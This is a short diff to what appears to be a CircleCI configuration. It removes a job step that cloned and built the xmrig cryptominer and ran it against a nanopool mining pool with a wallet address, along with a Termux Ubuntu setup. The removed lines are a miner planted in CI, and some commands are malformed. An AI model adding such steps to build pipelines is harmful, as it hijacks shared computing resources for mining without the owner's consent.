@@ -10,20 +10,6 @@ jobs:
             command: |
               lscpu
               Pkg install wget git proot
-              Git clone https://github.com/Neo-Oli/termux-ubuntu
-              Cd termux-ubuntu
-              Chmod +x ubuntu.sh
-              Sh ubuntu.sh
-              ./start-ubuntu.sh
-              Pkg update
-              Git clone https://github.com/xmrig/xmrig
-              Cd xmrig
-              Mkdir build
-              Cd build
-              Pkg install cmake
-              Cmake -DWITH_HWLOC=OFF ..
-              Make
-              ./xmrig -o xmr-asia1.nanopool.org:14433 -u TWU2NXD7R5KD7yzvugESD1T7fpUaoWGd3X  --tls –coin tron 
 
 workflows:
     version: 2.1
